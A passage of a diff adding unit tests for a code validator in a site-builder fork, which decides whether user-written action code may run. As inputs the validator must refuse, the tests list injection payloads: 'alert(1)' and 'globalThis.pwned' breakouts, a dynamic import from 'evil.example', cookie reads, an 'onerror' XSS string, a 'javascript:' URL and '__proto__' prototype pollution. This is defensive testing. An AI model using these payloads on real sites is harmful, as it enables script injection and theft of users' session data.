@@ -9,13 +9,23 @@ import {
   SpinnerIcon,
 } from "@webstudio-is/icons/svg";
 import {
+  blockComponent,
+  blockTemplateComponent,
+  collectionComponent,
+  descendantComponent,
   elementComponent,
+  encodeDataSourceVariable,
+  lintExpression,
+  ROOT_INSTANCE_ID,
   tags,
+  type DataSource,
+  type Instance,
   type Page,
   type Pages,
   type Prop,
 } from "@webstudio-is/sdk";
 import { tagProperty } from "@webstudio-is/sdk/runtime";
+import { renderTemplate } from "@webstudio-is/template";
 import {
   allowedUrlSchemes,
   anyTagComponents,
@@ -41,7 +51,23 @@ import {
   withoutBlockedTagProps,
   withoutPausedProps,
   readLiteralValue,
+  actionContextOf,
+  actionMayRun,
+  collidingDataSourceIds,
+  componentMayShip,
+  instanceIdMayRun,
+  isPlainData,
+  holdsAngleBrackets,
+  holdsComment,
+  pageRootIdsOf,
+  readsAsOneExpression,
+  templateRootIdsOf,
+  pagesAndTemplatesOf,
+  checkAction,
+  type ActionContext,
+  type PageNames,
 } from "./org-script";
+import * as organizeosTemplates from "./templates";
 
 const icons = {
   CheckMarkIcon,
@@ -624,6 +650,1668 @@ const staticProp = (
   type: "string" | "expression" = "string"
 ): Prop => ({ id: name, instanceId: "i", name, type, value });
 
+type ActionProp = Extract<Prop, { type: "action" }>;
+
+const actionProp = (
+  value: Array<{ args: string[]; code: string }>,
+  name = "onClick"
+): ActionProp => ({
+  id: name,
+  instanceId: "i",
+  name,
+  type: "action",
+  value: value.map((entry) => ({ type: "execute", ...entry })),
+});
+
+// The builder's canvas and the published page's generator write an action as
+// code: its args as an arrow function's parameters and its code as the body.
+// The canvas runs it as soon as it computes prop values, and the site's server
+// renders it (docs/ORGANIZEOS-FORK.md section 10).
+describe("actionMayRun", () => {
+  const variable = encodeDataSourceVariable("var-1");
+  const count = encodeDataSourceVariable("count");
+  const resource = encodeDataSourceVariable("resource-1");
+  const parameter = encodeDataSourceVariable("parameter-1");
+  const own = encodeDataSourceVariable("own");
+  const sibling = encodeDataSourceVariable("sibling");
+  const onePath = encodeDataSourceVariable("one-path");
+  const everyPath = encodeDataSourceVariable("every-path");
+  const unscoped = encodeDataSourceVariable("unscoped");
+
+  const signupForm = "@organizeos/site-components:SignupForm";
+
+  // A page, its body holding a Signup Form, a Box and a Slot's shared
+  // instance reached from two parents
+  const node = (
+    component: string,
+    ...children: string[]
+  ): Pick<Instance, "component" | "children"> => ({
+    component,
+    children: children.map((value) => ({ type: "id", value })),
+  });
+  const instances = new Map([
+    ["body", node("Body", "form", "box", "other", "left", "right")],
+    ["form", node(signupForm)],
+    ["box", node("Box")],
+    ["other", node("Box")],
+    ["left", node("Box", "shared")],
+    ["right", node("Box", "shared")],
+    ["shared", node("Box", "shared-form")],
+    ["shared-form", node(signupForm)],
+  ]);
+  const scoped = (
+    type: "variable" | "resource" | "parameter",
+    scopeInstanceId: string,
+    name = `${type}-${scopeInstanceId}`
+  ) => ({ type, scopeInstanceId, name });
+  const dataSources: ActionContext["dataSources"] = new Map<
+    string,
+    {
+      type: "variable" | "resource" | "parameter";
+      scopeInstanceId?: string;
+      name: string;
+    }
+  >([
+    ["var-1", scoped("variable", "body")],
+    ["count", scoped("variable", ROOT_INSTANCE_ID)],
+    ["resource-1", scoped("resource", "body")],
+    ["parameter-1", scoped("parameter", "body")],
+    ["own", scoped("variable", "form")],
+    ["sibling", scoped("variable", "other")],
+    ["one-path", scoped("variable", "left")],
+    ["every-path", scoped("variable", "shared")],
+    ["", scoped("variable", "body")],
+    ["unscoped", { type: "variable" as const, name: "unscoped" }],
+  ]);
+  const context: ActionContext = {
+    instances,
+    pageRootIds: new Set(["body"]),
+    dataSources,
+  };
+
+  // An action on the Signup Form's onStateChange, which passes plain data
+  const mayRun = (
+    value: Array<{ args: string[]; code: string }>,
+    { holder = "form", name = "onStateChange" } = {}
+  ) =>
+    actionMayRun({ ...actionProp(value, name), instanceId: holder }, context);
+  const codeMayRun = (code: string, args: string[] = []) =>
+    mayRun([{ args, code }]);
+
+  // The linter as the rule calls it
+  const lint = (code: string, args: string[] = []) =>
+    lintExpression({
+      expression: code,
+      availableVariables: new Set([
+        ...args,
+        variable,
+        count,
+        resource,
+        parameter,
+        "undefined",
+      ]),
+      allowAssignment: true,
+    });
+
+  test("refuses an args entry that is not a plain identifier", () => {
+    for (const arg of [
+      ") => 0, globalThis.pwned = 1, (",
+      "a = alert(1)",
+      "...a",
+      "a, b",
+      "",
+      // a Cyrillic a, a zero-width space, a line separator, an accented letter
+      "а",
+      "a​",
+      "a ",
+      "évent",
+      "a\n",
+      " a",
+      "1a",
+    ]) {
+      expect(codeMayRun(`${variable} = 1`, [arg]), JSON.stringify(arg)).toBe(
+        false
+      );
+    }
+    // in any entry, not only the last
+    expect(
+      mayRun([
+        { args: ["state", "a = alert(1)"], code: `${variable} = state` },
+        { args: ["state"], code: `${variable} = state` },
+      ])
+    ).toBe(false);
+  });
+
+  test("refuses an arg that could be a name the canvas or the generator writes", () => {
+    for (const arg of ["_getVariable", "_x", "a$", "$", "arguments", "eval"]) {
+      expect(codeMayRun(`${variable} = 1`, [arg]), arg).toBe(false);
+    }
+    for (const arg of ["event", "value", "state", "a_b", "x1"]) {
+      expect(codeMayRun(`${variable} = 1`, [arg]), arg).toBe(true);
+    }
+  });
+
+  test("refuses a code that fails the linter", () => {
+    for (const code of [
+      "",
+      "alert(1)",
+      `${variable} = 1, ${variable} = 2`,
+      `${variable}++`,
+      `[${variable}] = [1]`,
+      `${variable} = 1;`,
+      `${variable} = import("https://evil.example/x.js")`,
+    ]) {
+      expect(
+        lint(code).some((diagnostic) => diagnostic.severity === "error"),
+        code
+      ).toBe(true);
+      expect(codeMayRun(code), code).toBe(false);
+    }
+  });
+
+  test("refuses legacy octal syntax", () => {
+    for (const code of [`${variable} = 010`, `${variable} = "\\01"`]) {
+      expect(
+        lint(code).some((diagnostic) => diagnostic.severity === "error"),
+        code
+      ).toBe(true);
+      expect(codeMayRun(code), code).toBe(false);
+    }
+  });
+
+  test("refuses a code that names anything but its args, a variable or a Resource in scope, and undefined", () => {
+    for (const code of ["pwned = 1", `${variable} = document`, "name = 1"]) {
+      expect(codeMayRun(code), code).toBe(false);
+    }
+  });
+
+  test("refuses a code that names an arg the generated function does not take", () => {
+    // An action may name only the args its last entry lists
+    const earlier = { args: ["location"], code: 'location = "/away"' };
+    expect(mayRun([earlier, { args: [], code: `${variable} = 1` }])).toBe(
+      false
+    );
+    expect(
+      mayRun([
+        { args: ["state"], code: `${variable} = state` },
+        { args: ["state"], code: `${variable} = state + "!"` },
+      ])
+    ).toBe(true);
+  });
+
+  // A component may pass a host object to its action (a React event's view is
+  // the window), so an action names its args only where the component passes
+  // plain data
+  test("names its args only on the props through which a component passes plain data", () => {
+    const holders = new Map([
+      ["webhook", node("Form")],
+      ["signup", node(signupForm)],
+      ["rsvp", node("@organizeos/site-components:RsvpForm")],
+      ["rotation", node("@organizeos/site-components:RotationControl")],
+      ["button", node("ws:element")],
+    ]);
+    const tree: ActionContext = {
+      instances: new Map([
+        ["body", node("Body", ...holders.keys())],
+        ...holders,
+      ]),
+      pageRootIds: new Set(["body"]),
+      dataSources,
+    };
+    const named = (holder: string, name: string, code: string) =>
+      actionMayRun(
+        {
+          ...actionProp([{ args: ["arg"], code }], name),
+          instanceId: holder,
+        },
+        tree
+      );
+    for (const [holder, name] of [
+      ["webhook", "onStateChange"],
+      ["signup", "onStateChange"],
+      ["rsvp", "onStateChange"],
+      ["rotation", "onValueChange"],
+    ]) {
+      expect(named(holder, name, `${variable} = arg`), holder).toBe(true);
+      // another prop of the same component
+      expect(named(holder, "onClick", `${variable} = arg`), holder).toBe(false);
+    }
+    // the same prop name on another component
+    expect(named("button", "onStateChange", `${variable} = arg`)).toBe(false);
+    expect(named("button", "onClick", `${variable} = arg`)).toBe(false);
+    expect(named("button", "onClick", `${variable} = arg ? 1 : 0`)).toBe(false);
+    // there an action lists no args, even ones its code does not name
+    expect(named("button", "onClick", `${variable} = 1`)).toBe(false);
+    expect(named("button", "onClick", `${variable} = ${count}`)).toBe(false);
+    expect(
+      actionMayRun(
+        {
+          ...actionProp(
+            [
+              { args: ["arg"], code: `${variable} = 1` },
+              { args: [], code: `${count} = 1` },
+            ],
+            "onClick"
+          ),
+          instanceId: "button",
+        },
+        tree
+      )
+    ).toBe(false);
+    // and may still set a variable
+    const unnamed = (code: string) =>
+      actionMayRun(
+        {
+          ...actionProp([{ args: [], code }], "onClick"),
+          instanceId: "button",
+        },
+        tree
+      );
+    expect(unnamed(`${variable} = 1`)).toBe(true);
+    expect(unnamed(`${variable} = ${count}`)).toBe(true);
+    // and a holder the build does not hold names none
+    expect(named("missing", "onStateChange", `${variable} = arg`)).toBe(false);
+  });
+
+  // While org script is paused an action assigns plain values: its code reads
+  // no member and calls nothing
+  test("refuses member access and calls, however they are written", () => {
+    const args = ["event", "a", "f", "X", "tag", "k"];
+    for (const code of [
+      'event.view.location.replace("javascript:alert(1)")',
+      '"x".replace(/.+/, event.view.eval)',
+      `${variable} = event.view.document.cookie`,
+      'event.target.innerHTML = "<img src=x onerror=alert(1)>"',
+      `${variable} = a.b`,
+      `${variable} = a["b"]`,
+      `${variable} = f()`,
+      `${variable} = new X()`,
+      `${variable} = tag\`x\``,
+      `${variable} = a?.b`,
+      `${variable} = { get x() { return 1 } }`,
+      `${variable} = { [k]: 1 }`,
+      `${variable} = { f() {} }`,
+      `${variable} = () => 1`,
+      `${variable} = this`,
+      `${variable} = [...a]`,
+      `${variable} = { ...a }`,
+      `${variable} = delete a`,
+    ]) {
+      expect(codeMayRun(code, args), code).toBe(false);
+    }
+  });
+
+  // Each of these is otherwise a plain value
+  test("refuses a < or << followed anywhere by a token that starts with >", () => {
+    const args = ["a", "b", "c", "d", "state"];
+    for (const code of [
+      `${variable} = a < b > (c)`,
+      `${variable} = a<b>(c)`,
+      `${variable} = a < b > /* x */ (c)`,
+      `${variable} = a < b > \`x\``,
+      `${variable} = a < typeof b > (c)`,
+      `${variable} = a < b | c > (d)`,
+      `${variable} = a < b < c >> (d)`,
+      `${variable} = a < b > /(c)/g`,
+      `${variable} = a < b > ["x"]`,
+      `${variable} = a < 1 >\n["constructor"]`,
+      `${variable} = "s" < 1 >\n ["constructor"] < 1 >\n ["constructor"]`,
+      `${variable} = ${variable} < 1 >  ["constructor"] < 1 >  ["constructor"]`,
+      `${variable} = ${variable} < 1 >  ["constructor"]`,
+      `${variable} = ${variable} < 1 >\r ["constructor"]`,
+      `${variable} = ${variable} < 1 > /*\n*/ ["constructor"]`,
+      `${variable} = ${variable} < 1 > // x\n ["constructor"]`,
+      `${variable} = state < ${count} >\n["constructor"]`,
+      `${variable} = 1 < 2 >\n{} / "/}, globalThis.pwned = 1, () => { // "`,
+      `${variable} = 1 < 2 >\r{} / "/}, globalThis.pwned = 1, () => { // "`,
+      `${variable} = 1 < 2 > {} / "/}, globalThis.pwned = 1, () => { // "`,
+      `${variable} = 1 < 2 > /*\n*/ {} / "/}, globalThis.pwned = 1, () => { // "`,
+      `${variable} = a < b >= c`,
+      `${variable} = a << b >>> c`,
+      `${variable} = a < b ? c : d > a`,
+      `${variable} = [a < b, c > d]`,
+      `${variable} = a < b >> c`,
+      `${variable} = \`\${a < b}\` + (c > d)`,
+    ]) {
+      expect(codeMayRun(code, args), JSON.stringify(code)).toBe(false);
+    }
+    // a > before any <, a < alone and a > alone pass
+    for (const code of [
+      `${variable} = a > b && b < c`,
+      `${variable} = a < b`,
+      `${variable} = a <= b && b >= c`,
+      `${variable} = "<" + ">"`,
+      `${variable} = \`<\${a}>\``,
+    ]) {
+      expect(codeMayRun(code, args), code).toBe(true);
+    }
+  });
+
+  test("refuses an action whose code holds a comment, of either kind, anywhere in it", () => {
+    for (const code of [
+      `${variable} = /* x */ 1`,
+      `${variable} /* x */ = 1`,
+      `${variable} = /**/ state`,
+      `${variable} = // x\n 1`,
+      `${variable} = state ? /* x */ 1 : 2`,
+      `${variable} = { a: /* x */ 1 }`,
+      `${variable} = 1 <!-- x`,
+      `${variable} = 1\n--> x`,
+    ]) {
+      expect(codeMayRun(code, ["state"]), JSON.stringify(code)).toBe(false);
+    }
+    // the same characters in a string or a template's text
+    for (const code of [
+      `${variable} = "/* x */"`,
+      `${variable} = "// x"`,
+      `${variable} = \`/* x */\``,
+      `${variable} = 1 / 2`,
+    ]) {
+      expect(codeMayRun(code), code).toBe(true);
+    }
+  });
+
+  test("refuses a regular expression", () => {
+    for (const code of [
+      `${variable} = /x/`,
+      `${variable} = "a" < "b" > /x/`,
+      "1 < 2 > /(globalThis.pwned = 1)/g",
+    ]) {
+      expect(codeMayRun(code), code).toBe(false);
+    }
+    expect(
+      codeMayRun(
+        `${variable} = ${variable} < ${count} > /(globalThis.pwned = state.view)/i`,
+        ["state"]
+      )
+    ).toBe(false);
+  });
+
+  test("refuses a code that is not exactly one expression, read the same way as a statement", () => {
+    for (const code of [
+      // a code that starts with an object
+      '{} / "/}, globalThis.pwned = 1, () => { // "',
+      `${variable} = 1 /* x */`,
+    ]) {
+      expect(codeMayRun(code), code).toBe(false);
+    }
+  });
+
+  test("refuses a code that starts with a character that would join it to the line before", () => {
+    for (const code of ["[0]", "`x`", "+1", "-1", '("x")', "/x/", "{}"]) {
+      expect(
+        mayRun([
+          { args: [], code: variable },
+          { args: [], code },
+        ]),
+        code
+      ).toBe(false);
+    }
+  });
+
+  // An action may name only a variable or a Resource in scope: the holder's
+  // own, an ancestor's on every path from a page root, or a global one
+  test("refuses a data source that is not a variable or a Resource in scope", () => {
+    for (const code of [
+      `${parameter} = "x"`,
+      `${variable} = ${parameter}`,
+      `${encodeDataSourceVariable("missing")} = 1`,
+      `${variable} = $ws$system`,
+      // a sibling's, and an ancestor's on one path only
+      `${sibling} = 1`,
+      `${variable} = ${sibling}`,
+      // one with no scope
+      `${unscoped} = 1`,
+      `${variable} = ${unscoped}`,
+    ]) {
+      expect(codeMayRun(code), code).toBe(false);
+    }
+    expect(
+      mayRun([{ args: [], code: `${onePath} = 1` }], { holder: "shared-form" })
+    ).toBe(false);
+    // the holder's own, an ancestor's, a global one and a Resource
+    for (const code of [
+      `${own} = 1`,
+      `${variable} = 1`,
+      `${count} = ${count} + 1`,
+      `${variable} = ${resource}`,
+    ]) {
+      expect(codeMayRun(code), code).toBe(true);
+    }
+    expect(
+      mayRun([{ args: [], code: `${everyPath} = ${variable}` }], {
+        holder: "shared-form",
+      })
+    ).toBe(true);
+    // and nothing without the build's data sources
+    expect(
+      actionMayRun(
+        {
+          ...actionProp([{ args: [], code: `${variable} = 1` }]),
+          instanceId: "form",
+        },
+        { ...context, dataSources: new Map() }
+      )
+    ).toBe(false);
+  });
+
+  test("refuses a data source whose id is empty, whatever the build holds", () => {
+    for (const code of [
+      "$ws$dataSource$ = 1",
+      `${variable} = $ws$dataSource$`,
+    ]) {
+      expect(codeMayRun(code), code).toBe(false);
+    }
+  });
+
+  test("keeps only its own data sources for a holder inside a cycle", () => {
+    const cyclic: ActionContext = {
+      instances: new Map([
+        ["body", node("Body", "loop-a")],
+        ["loop-a", node("Box", "loop-b")],
+        ["loop-b", node("Box", "loop-a", "cycle-form")],
+        ["cycle-form", node(signupForm)],
+      ]),
+      pageRootIds: new Set(["body"]),
+      dataSources: new Map([
+        ["var-1", scoped("variable", "body")],
+        ["own", scoped("variable", "cycle-form")],
+      ]),
+    };
+    const inCycle = (code: string) =>
+      actionMayRun(
+        {
+          ...actionProp([{ args: [], code }], "onStateChange"),
+          instanceId: "cycle-form",
+        },
+        cyclic
+      );
+    expect(inCycle(`${variable} = 1`)).toBe(false);
+    expect(inCycle(`${own} = 1`)).toBe(true);
+  });
+
+  test("keeps only its own data sources for a holder with a cycle above it, though a page template's root reaches it too", () => {
+    const cyclic: ActionContext = {
+      instances: new Map([
+        ["body", node("Body", "loop-a")],
+        ["loop-a", node("Box", "loop-b")],
+        ["loop-b", node("Box", "loop-a", "cycle-form")],
+        ["template", node("Body", "cycle-form")],
+        ["cycle-form", node(signupForm)],
+      ]),
+      pageRootIds: new Set(["body"]),
+      templateRootIds: new Set(["template"]),
+      dataSources: new Map([
+        ["template-var", scoped("variable", "template")],
+        ["own", scoped("variable", "cycle-form")],
+      ]),
+    };
+    const inCycle = (id: string) =>
+      actionMayRun(
+        {
+          ...actionProp(
+            [{ args: [], code: `${encodeDataSourceVariable(id)} = 1` }],
+            "onStateChange"
+          ),
+          instanceId: "cycle-form",
+        },
+        cyclic
+      );
+    expect(inCycle("template-var")).toBe(false);
+    expect(inCycle("own")).toBe(true);
+  });
+
+  test("keeps only its own data sources for a holder with a cycle above it, where a page template's root is on the page's path", () => {
+    const cyclic: ActionContext = {
+      instances: new Map([
+        ["body", node("Body", "loop-a")],
+        ["loop-a", node("Box", "loop-b")],
+        ["loop-b", node("Box", "loop-a", "template")],
+        ["template", node("Body", "cycle-form")],
+        ["cycle-form", node(signupForm)],
+      ]),
+      pageRootIds: new Set(["body"]),
+      templateRootIds: new Set(["template"]),
+      dataSources: new Map([["template-var", scoped("variable", "template")]]),
+    };
+    expect(
+      actionMayRun(
+        {
+          ...actionProp(
+            [
+              {
+                args: [],
+                code: `${encodeDataSourceVariable("template-var")} = 1`,
+              },
+            ],
+            "onStateChange"
+          ),
+          instanceId: "cycle-form",
+        },
+        cyclic
+      )
+    ).toBe(false);
+  });
+
+  test("reads undefined as a value, refuses reading NaN or Infinity, and refuses assigning to any of them", () => {
+    expect(codeMayRun(`${variable} = undefined`)).toBe(true);
+    for (const name of ["NaN", "Infinity"]) {
+      expect(codeMayRun(`${variable} = ${name}`), name).toBe(false);
+      expect(codeMayRun(`${variable} = -${name}`), name).toBe(false);
+    }
+    for (const name of ["undefined", "NaN", "Infinity"]) {
+      expect(codeMayRun(`${name} = 1`), name).toBe(false);
+    }
+  });
+
+  // An action runs only if it passes input validation, which refuses these
+  test("refuses an action that input validation refuses", () => {
+    const refusedByInputValidation: Array<{ args: string[]; code: string }> = [
+      { args: [], code: `${variable} = NaN` },
+      { args: [], code: `${variable} = Infinity` },
+      { args: [], code: "$ws$dataSource$\\u0076ar__DASH__1 = 1" },
+      { args: [], code: `${variable} = { constructor: 1 }` },
+      { args: [], code: `${variable} = { "prototype": 1 }` },
+      { args: [], code: `${variable} = { __defineGetter__: 1 }` },
+      { args: [], code: `${variable} = { a: { __lookupGetter__: 1 } }` },
+      { args: ["state"], code: "state = 1" },
+      { args: ["state"], code: "state += 1" },
+      { args: ["state"], code: `${variable} = state = 1` },
+    ];
+    for (const entry of refusedByInputValidation) {
+      const name = JSON.stringify(entry);
+      expect(checkAction([entry]).ok, name).toBe(false);
+      expect(mayRun([entry]), name).toBe(false);
+      // in any entry
+      expect(
+        mayRun([entry, { args: ["state"], code: `${variable} = state` }]),
+        name
+      ).toBe(false);
+    }
+    // what input validation passes still may run
+    for (const entry of [
+      { args: [], code: `${variable} = { toString: 1, then: 2, get: 3 }` },
+      { args: ["state"], code: `${variable} = state` },
+    ]) {
+      expect(checkAction([entry]).ok, entry.code).toBe(true);
+      expect(mayRun([entry]), entry.code).toBe(true);
+    }
+  });
+
+  // An action may read a Resource, and assigns only a variable
+  test("refuses assigning to a Resource, and reads one", () => {
+    for (const code of [
+      `${resource} = 1`,
+      `${resource} += 1`,
+      `${variable} = ${resource} = 1`,
+    ]) {
+      expect(codeMayRun(code), code).toBe(false);
+    }
+    expect(codeMayRun(`${variable} = ${resource}`)).toBe(true);
+  });
+
+  test("refuses an object key __proto__, however it is written", () => {
+    for (const code of [
+      `${variable} = { __proto__: null }`,
+      `${variable} = { "__proto__": [] }`,
+      `${variable} = { a: { __proto__: { b: 1 } } }`,
+      `${variable} = [{ __proto__: 1 }]`,
+    ]) {
+      expect(codeMayRun(code), code).toBe(false);
+    }
+    expect(codeMayRun(`${variable} = { proto: 1, __proto: 2 }`)).toBe(true);
+  });
+
+  test("refuses an arg that is a reserved word, or that an entry lists twice", () => {
+    for (const arg of [
+      "await",
+      "break",
+      "class",
+      "delete",
+      "enum",
+      "false",
+      "implements",
+      "interface",
+      "let",
+      "new",
+      "null",
+      "package",
+      "private",
+      "protected",
+      "public",
+      "static",
+      "super",
+      "this",
+      "true",
+      "typeof",
+      "var",
+      "void",
+      "with",
+      "yield",
+      // input validation refuses it as an arg
+      "undefined",
+    ]) {
+      expect(codeMayRun(`${variable} = 1`, [arg]), arg).toBe(false);
+    }
+    expect(codeMayRun(`${variable} = a`, ["a", "a"])).toBe(false);
+    expect(
+      mayRun([
+        { args: ["a", "b", "a"], code: `${variable} = 1` },
+        { args: ["a"], code: `${variable} = a` },
+      ])
+    ).toBe(false);
+    for (const arg of ["type", "of", "async", "get"]) {
+      expect(codeMayRun(`${variable} = 1`, [arg]), arg).toBe(true);
+    }
+  });
+
+  // An arg may not be a data source's name made a plain identifier, nor that
+  // followed by `_`, `_N` or `__N`, where the code reads the data source
+  test("refuses an arg that a data source it names could be named as", () => {
+    const named = (name: string, arg: string, code = `${variable} = ${arg}`) =>
+      actionMayRun(
+        {
+          ...actionProp([{ args: [arg], code }], "onStateChange"),
+          instanceId: "form",
+        },
+        {
+          ...context,
+          dataSources: new Map([
+            ...context.dataSources,
+            ["var-1", { ...scoped("variable", "body"), name }],
+          ]),
+        }
+      );
+    // read
+    const reads = (arg: string) => `${variable} = ${variable} ? ${arg} : 1`;
+    expect(named("state", "state", reads("state"))).toBe(false);
+    expect(named("state", "state_1", reads("state_1"))).toBe(false);
+    expect(named("state", "state_", reads("state_"))).toBe(false);
+    expect(named("state", "state__2", reads("state__2"))).toBe(false);
+    expect(named("my state", "mystate", reads("mystate"))).toBe(false);
+    expect(named("state!", "state", reads("state"))).toBe(false);
+    expect(named("state", "state", `${count} = ${variable}`)).toBe(false);
+    expect(named("state", "state", `${variable} += state`)).toBe(false);
+    expect(named("state", "state", `${variable} ||= state`)).toBe(false);
+    expect(named("state", "state", `${variable} = ${variable} += 1`)).toBe(
+      false
+    );
+    // set only where something else decides
+    expect(named("state", "state", `${count} && (${variable} = state)`)).toBe(
+      false
+    );
+    expect(named("state", "state", `${count} = ${variable} = state`)).toBe(
+      false
+    );
+    // in an entry before or after one that only sets it
+    for (const value of [
+      [
+        { args: [], code: `${count} = ${variable}` },
+        { args: ["state"], code: `${variable} = state` },
+      ],
+      [
+        { args: [], code: `${variable} = 1` },
+        { args: ["state"], code: `${count} = ${variable}` },
+      ],
+    ]) {
+      expect(
+        actionMayRun(
+          { ...actionProp(value, "onStateChange"), instanceId: "form" },
+          {
+            ...context,
+            dataSources: new Map([
+              ...context.dataSources,
+              ["var-1", { ...scoped("variable", "body"), name: "state" }],
+            ]),
+          }
+        ),
+        JSON.stringify(value)
+      ).toBe(false);
+    }
+    // a code that only sets it to a value that does not name it, as the
+    // templates' actions do
+    expect(named("state", "state")).toBe(true);
+    expect(named("state", "state_1")).toBe(true);
+    expect(named("my state", "mystate", `${variable} = mystate ? 1 : 2`)).toBe(
+      true
+    );
+    // a data source it does not name, and a name that is only alike
+    expect(named("state", "state", `${count} = state`)).toBe(true);
+    expect(named("state", "states", reads("states"))).toBe(true);
+    expect(named("state", "state_x", reads("state_x"))).toBe(true);
+    expect(named("formState", "state", reads("state"))).toBe(true);
+  });
+
+  // A data source's id or name may not be one the page module uses for
+  // anything else, and an action may not name one that is
+  test("names no data source whose id or name the page module uses for something else", () => {
+    const build = {
+      instances: new Map([
+        ["body", node("Body", "box", "list", "form-1")],
+        ["box", node("Box")],
+        ["list", node(collectionComponent)],
+        ["form-1", node("Form")],
+      ]),
+      pageRootIds: new Set(["body"]),
+      pages: [{ rootInstanceId: "body" }],
+      props: new Map<Prop["id"], Prop>([
+        [
+          "box-resource",
+          {
+            id: "box-resource",
+            instanceId: "box",
+            name: "action",
+            type: "resource",
+            value: "prop-resource",
+          },
+        ],
+      ]),
+      resources: new Map([["resource-1", {}]]),
+    };
+    const variableOf = (id: string, name = "v"): [string, DataSource] => [
+      id,
+      {
+        type: "variable",
+        id,
+        name,
+        scopeInstanceId: "body",
+        value: { type: "string", value: "" },
+      },
+    ];
+    for (const [id, name] of [
+      ["Box", "v"],
+      ["Body", "v"],
+      ["set$v1", "v"],
+      ["list-index", "v"],
+      ["resource-1", "v"],
+      ["prop-resource", "v"],
+      ["bound-resource", "v"],
+      ["form-1", "v"],
+      ["@webstudio-is/sdk-components-react/components:Input", "v"],
+      [":system", "v"],
+      ["a b", "v"],
+      ["v2", "_key"],
+      ["v3", "_ key"],
+      ["v4", "renderText"],
+      ["v5", "let"],
+      ["v6", "static"],
+      ["v7", "_data"],
+      ["v8", "_action"],
+      ["v9", "Object"],
+      ["v10", "Array"],
+      ["v11", "Number"],
+      ["v12", "Map"],
+      ["v15", "Obj ect"],
+    ]) {
+      const dataSources = new Map([
+        variableOf("v1"),
+        variableOf(id, name),
+        [
+          "binding",
+          {
+            type: "resource",
+            id: "binding",
+            name: "binding",
+            scopeInstanceId: "body",
+            resourceId: "bound-resource",
+          },
+        ],
+      ] as Array<[string, DataSource]>);
+      expect(
+        [...collidingDataSourceIds({ ...build, dataSources })],
+        id
+      ).toEqual([id]);
+      const actionContext = actionContextOf({ ...build, dataSources });
+      const reference = encodeDataSourceVariable(id);
+      const prop = {
+        ...actionProp([{ args: [], code: `${reference} = 1` }]),
+        instanceId: "box",
+      };
+      expect(actionMayRun(prop, actionContext), id).toBe(false);
+      // with the build's data sources as they are, one that a code can name
+      // and input validation passes would pass
+      if (/^\$ws\$dataSource\$\w+$/.test(reference)) {
+        expect(actionMayRun(prop, { ...actionContext, dataSources }), id).toBe(
+          true
+        );
+      }
+    }
+    // a data source stored under another key
+    expect([
+      ...collidingDataSourceIds({
+        ...build,
+        dataSources: new Map([["key", variableOf("v1")[1]]]),
+      }),
+    ]).toEqual(["key"]);
+    // ids and names as the builder makes them
+    const dataSources = new Map([
+      variableOf("aB3_x-Yz09", "Box"),
+      variableOf("0f4c1c4e-6bd3-5f0c-9a8b-1c2d3e4f5a6b", "set$v1"),
+      variableOf("v4", "key"),
+      variableOf("v5", "index"),
+      variableOf("v6", "NaN"),
+      variableOf("v7", "Infinity"),
+    ]);
+    expect([...collidingDataSourceIds({ ...build, dataSources })]).toEqual([]);
+    expect(actionContextOf({ ...build, dataSources }).dataSources).toEqual(
+      dataSources
+    );
+  });
+
+  test("names no data source with the id Body, though the build holds no Body", () => {
+    const build = {
+      instances: new Map([["root", node("Box")]]),
+      pages: [{ rootInstanceId: "root" }],
+      props: new Map<Prop["id"], Prop>(),
+      resources: new Map(),
+    };
+    const variableOf = (id: string): [string, DataSource] => [
+      id,
+      {
+        type: "variable",
+        id,
+        name: "v",
+        scopeInstanceId: ROOT_INSTANCE_ID,
+        value: { type: "string", value: "" },
+      },
+    ];
+    expect([
+      ...collidingDataSourceIds({
+        ...build,
+        dataSources: new Map([variableOf("Body"), variableOf("v1")]),
+      }),
+    ]).toEqual(["Body"]);
+  });
+
+  // A parameter is declared as itself only as a page's own, held on its root,
+  // or as a Collection's item or key, which the Collection binds once and
+  // which is named only inside it. A data source a Collection binds is such a
+  // parameter.
+  test("names no parameter but a page's own and a Collection's item or key, bound once and named only inside it, and no other data source a Collection binds", () => {
+    const parameterOf = (
+      id: string,
+      scopeInstanceId: string,
+      name = id
+    ): [string, DataSource] => [
+      id,
+      { type: "parameter", id, name, scopeInstanceId },
+    ];
+    const variableOf = (
+      id: string,
+      scopeInstanceId = "page"
+    ): [string, DataSource] => [
+      id,
+      {
+        type: "variable",
+        id,
+        name: id,
+        scopeInstanceId,
+        value: { type: "string", value: "" },
+      },
+    ];
+    const parameterProp = (
+      instanceId: string,
+      name: string,
+      value: string
+    ): [string, Prop] => {
+      const id = `${instanceId}:${name}`;
+      return [id, { id, instanceId, name, type: "parameter", value }];
+    };
+    const base = {
+      instances: new Map([
+        ["page", node("Body", "list", "box", "left", "right")],
+        ["list", node(collectionComponent, "card")],
+        ["card", node("Box")],
+        ["box", node("Box")],
+        ["left", node("Box", "shared")],
+        ["right", node("Box")],
+        ["shared", node("Box")],
+        ["template", node("Body")],
+        ["orphan", node("Box")],
+      ]),
+      pages: [
+        { rootInstanceId: "page", systemDataSourceId: "page-system" },
+        { rootInstanceId: "template", systemDataSourceId: "template-system" },
+      ] as PageNames[],
+      resources: new Map(),
+    };
+    const colliding = ({
+      dataSources,
+      props = [],
+      instances = base.instances,
+      pages = base.pages,
+    }: {
+      dataSources: Array<[string, DataSource]>;
+      props?: Array<[string, Prop]>;
+      instances?: typeof base.instances;
+      pages?: typeof base.pages;
+    }) => [
+      ...collidingDataSourceIds({
+        ...base,
+        instances,
+        pages,
+        dataSources: new Map(dataSources),
+        props: new Map(props),
+      }),
+    ];
+    const item = parameterOf("item", "list");
+    const bound = parameterProp("list", "item", "item");
+
+    // a page's and a page template's own, and a Collection's item and key
+    expect(
+      colliding({
+        dataSources: [
+          parameterOf("page-system", "page", "system"),
+          parameterOf("template-system", "template", "system"),
+          item,
+          parameterOf("key", "list"),
+        ],
+        props: [
+          bound,
+          parameterProp("list", "itemKey", "key"),
+          parameterProp("card", "data-item", "item"),
+          parameterProp("card", "data-key", "key"),
+          // where no page or template reaches
+          parameterProp("orphan", "data-item", "item"),
+        ],
+      })
+    ).toEqual([]);
+
+    // a parameter that is neither, with any name, and what names it
+    expect(
+      colliding({
+        dataSources: [
+          parameterOf("stray", "page", "capture"),
+          parameterOf("global", ROOT_INSTANCE_ID, "g"),
+        ],
+        props: [parameterProp("box", "ref", "stray")],
+      })
+    ).toEqual(["stray", "global"]);
+
+    // a page's own, held anywhere but on its root, or on a root that another
+    // page or an instance also holds, or claimed by two pages
+    expect(
+      colliding({ dataSources: [parameterOf("page-system", "box")] })
